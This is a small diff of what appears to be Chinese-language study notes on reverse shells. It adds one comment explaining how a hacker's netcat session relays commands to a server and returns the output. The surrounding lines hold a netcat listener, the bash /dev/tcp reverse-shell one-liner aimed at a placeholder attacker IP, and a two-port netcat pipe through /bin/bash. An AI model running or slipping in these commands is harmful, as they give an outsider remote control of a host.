@@ -159,7 +159,7 @@ https://www.cnblogs.com/zhaijiahui/p/9028402.html
  
 客1. nc -lvp port							
 1.1  bash -i >& /dev/tcp/客ip/port 0>&1   #-i交互 ,本机创建一个bash环境(有两端)，传递给网络socket(文件描述符：/dev/tcp/客ip/port),则输入端0在本机，输出端1和2在网络socket
-
+										  #客户端(黑客)向进程输入命令，客nc进程将输入的命令通过tcp连接发送给服务端nc进程(和父进程用的是一个终端),服务端执行后将结果传输会客户端的进程(和父进程用的是一个终端)
 客1. nc -lvp port1                          #负责输入
      nc -lvp port2 						    #负责接收输出
 1.1  nc ip port1 | /bin/bash | nc ip port2  #连接，服务端不支持-e  	 
